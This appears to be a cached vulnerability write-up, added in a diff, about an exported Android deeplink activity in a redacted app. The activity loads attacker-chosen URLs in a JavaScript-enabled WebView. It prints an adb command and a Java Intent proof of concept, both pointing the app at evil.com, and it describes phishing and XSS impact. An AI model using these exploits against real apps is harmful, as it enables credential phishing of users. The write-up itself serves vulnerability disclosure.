@@ -1,0 +1,21 @@
+I"<<p>The app can be  launched by any other app because its deeplink activity is exported=true.</p>
+
+<h2 id="adb-exploit">Adb exploit</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell am start -n com.redacted.android/"com.redacted.activities.DeepLinkActivity" -d "https://evil.com"
+</code></pre></div></div>
+
+<h2 id="apk-exploit">Apk Exploit</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       Intent intent = new Intent();
+       intent.setClassName("com.redacted.android","com.redcated.android.activities.DeepLinkActivity");
+       intent.setData(Uri.parse("https://evil.com"));
+       startActivity(intent);
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>The attcker can craft a phishing page and grab the credentails. or can launch a xss attack because the webview has javascriptenabled(true). Most of the case the victim believe it as an legitimate url because it is loading in legititmate vulnerable app</p>
+
+<p><a href="./">back</a></p>
+:ET
